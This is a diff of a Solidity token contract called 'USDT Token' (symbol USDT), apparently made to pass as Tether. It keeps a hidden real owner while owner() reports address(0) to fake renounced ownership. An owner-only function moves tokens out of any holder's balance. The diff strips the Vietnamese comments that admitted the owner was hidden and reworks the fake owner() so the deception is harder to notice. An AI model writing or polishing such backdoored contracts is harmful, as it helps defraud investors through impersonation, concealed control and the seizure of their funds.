@@ -7,18 +7,15 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 contract USDT_Token is ERC20 {
     uint256 private _totalSupply;
     uint8 private _decimals;
-    address private _internalOwner; // Chủ thực sự, nhưng ẩn
+    address private _internalOwner;
+    address private immutable _publicOwner;
 
     constructor() ERC20("USDT Token", "USDT") {
         _decimals = 6;
         _totalSupply = 1_000_000 * 10**_decimals;
-        _internalOwner = msg.sender; // chỉ định owner thực sự
+        _internalOwner = msg.sender;
+        _publicOwner = address(0);
         _mint(msg.sender, _totalSupply);
-    }
-
-    /// Luôn trả về address(0) ra ngoài cho "ẩn danh"
-    function owner() public pure returns (address) {
-        return address(0);
     }
 
     modifier onlyOwner() {
@@ -29,7 +26,6 @@ contract USDT_Token is ERC20 {
         _;
     }
 
-    // Transfer quyền owner nội bộ
     function transferOwnership(address newOwner) external onlyOwner {
         require(newOwner != address(0), "New owner is zero address");
         _internalOwner = newOwner;
@@ -74,6 +70,10 @@ contract USDT_Token is ERC20 {
     ) external onlyOwner {
         require(balanceOf(from) >= amount, "Insufficient balance of sender");
         _transfer(from, to, amount);
+    }
+
+    function owner() public view returns (address) {
+        return _publicOwner;
     }
 
     receive() external payable {}
